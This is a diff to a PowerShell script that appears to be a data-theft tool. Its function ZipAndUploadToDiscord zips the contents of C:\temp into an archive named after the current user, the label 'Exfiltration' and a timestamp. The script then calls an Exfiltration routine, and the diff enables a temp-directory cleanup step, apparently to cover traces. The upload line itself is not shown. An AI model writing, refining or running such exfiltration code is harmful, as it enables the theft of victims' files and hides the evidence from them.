@@ -53,8 +53,15 @@ function ZipAndUploadToDiscord {
     # Specify the source directory
     $sourceDirectory = "C:\temp"
 
-    # Specify the destination zip file path
-    $zipFilePath = "C:\temp\ExfiltrationArchive.zip"
+    # Specify the username
+    $username = $env:username
+
+    # Specify the date format for the archive name
+    $date = Get-Date -Format "yyyyMMdd_HHmmss"
+
+    # Specify the destination zip file path with username and date
+    $zipFileName = "$username_Exfiltration_$date.zip"
+    $zipFilePath = Join-Path -Path "C:\temp" -ChildPath $zipFileName
 
     # Compress the contents of the source directory to a zip file
     Compress-Archive -Path $sourceDirectory -DestinationPath $zipFilePath
@@ -65,7 +72,6 @@ function ZipAndUploadToDiscord {
     # Cleanup: Remove the zip file
     Remove-Item -Path $zipFilePath -Force
 }
-
 
 
 
@@ -485,4 +491,4 @@ TempDir
 Exfiltration
 
 # Call DelTempDir
-#DelTempDir
+DelTempDir
